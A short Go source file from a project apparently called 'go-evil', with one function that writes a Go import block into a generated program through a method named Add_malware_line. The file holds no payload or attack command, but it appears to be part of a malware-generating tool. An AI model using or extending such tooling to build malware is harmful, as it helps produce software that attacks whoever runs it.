package finalize

import "github.com/TeamPhoneix/go-evil/utility/structure"

func Add_imports(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_malware_line("import (")
	for _, new_import := range data_object.GO_imports {
		data_object.Add_malware_line(new_import)
	}
	data_object.Add_malware_line(")")

	return structure.Send(data_object)
}
